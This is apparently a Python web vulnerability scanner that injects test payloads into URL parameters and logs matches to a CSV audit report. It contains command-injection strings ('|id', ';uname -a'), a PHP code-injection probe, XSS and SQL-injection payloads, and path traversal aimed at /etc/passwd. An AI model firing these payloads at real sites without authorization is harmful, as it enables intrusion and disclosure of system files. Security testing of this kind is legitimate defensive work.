import requests
import re
import time
import csv
import os  # Added for path management
from headers import ga
from cvss_map import CVSSMapping

VERBOSE = True 

def save_result(v_type, payload, poc):
    # 1. Define folder and ensure it exists
    output_folder = "reports"
    if not os.path.exists(output_folder):
        os.makedirs(output_folder)
    
    # 2. Define path inside the folder
    file_name = os.path.join(output_folder, "security_audit_report.csv")
    
    # Pacing: Wait slightly so we don't spam Gemini API
    time.sleep(1.5)
    data = CVSSMapping.get_details(v_type)
    
    fieldnames = ["Vulnerability Type", "CVSS Range", "Severity", "POC URL", "Payload", "Description", "AI Suggested Remedy"]
    file_exists = False
    try:
        with open(file_name, 'r'): file_exists = True
    except FileNotFoundError: pass

    with open(file_name, 'a', newline='', encoding='utf-8') as f:
        writer = csv.DictWriter(f, fieldnames=fieldnames)
        if not file_exists:
            writer.writeheader()
        writer.writerow({
            "Vulnerability Type": v_type,
            "CVSS Range": data.get("range"),
            "Severity": data["severity"],
            "POC URL": poc,
            "Payload": payload,
            "Description": data["desc"],
            "AI Suggested Remedy": data["remedy"]
        })

def engine(url, payloads, check, vuln_type):
    vuln_count = 0
    if "?" not in url: return 0
    
    base_url, params_str = url.split("?", 1)
    params = [p for p in params_str.split("&") if p]

    for param_pair in params:
        try:
            p_name = param_pair.split("=")[0]
        except IndexError: continue

        found_on_param = False
        for payload in payloads:
            if found_on_param: break 

            new_params = [f"{p.split('=')[0]}={payload}" if p.split('=')[0] == p_name else p for p in params]
            target = f"{base_url}?{'&'.join(new_params)}"
            
            try:
                res = requests.get(target, timeout=7, verify=False)
                
                if VERBOSE:
                    print(f" [DEBUG] Testing {p_name} | Code: {res.status_code} | Payload: {payload[:20]}...")

                if re.search(check, res.text, re.I):
                    print(f"{ga.RED} [*] {vuln_type} Found! Parameter: {p_name}{ga.END}")
                    save_result(vuln_type, payload, target)
                    vuln_count += 1
                    found_on_param = True 
            except: continue
    return vuln_count

# --- Modules ---
def rce_func(url):
    print(f"{ga.BOLD}\n [!] Scanning for RCE...{ga.END}")
    return engine(url, [';uname -a', '&& dir', '|id', '${@print(md5(zigoo))}'], r"root:x:0:0|Linux version|uid=|Directory of|zigoo", "RCE")

def xss_func(url):
    print(f"{ga.BOLD}\n [!] Scanning for XSS...{ga.END}")
    return engine(url, ['<script>alert(1)</script>', '"><svg/onload=alert(1)>'], r"alert\(1\)|<svg", "XSS")

def sqli_func(url):
    print(f"{ga.BOLD}\n [!] Scanning for SQLi...{ga.END}")
    return engine(url, ["'", "''", "' OR '1'='1"], r"SQL syntax|mysql_fetch|PostgreSQL|SQLite", "SQLi")

def lfi_func(url):
    print(f"{ga.BOLD}\n [!] Scanning for LFI...{ga.END}")
    return engine(url, ['../../../../etc/passwd', '..\\..\\win.ini'], r"root:x:0:0|\[extensions\]", "LFI")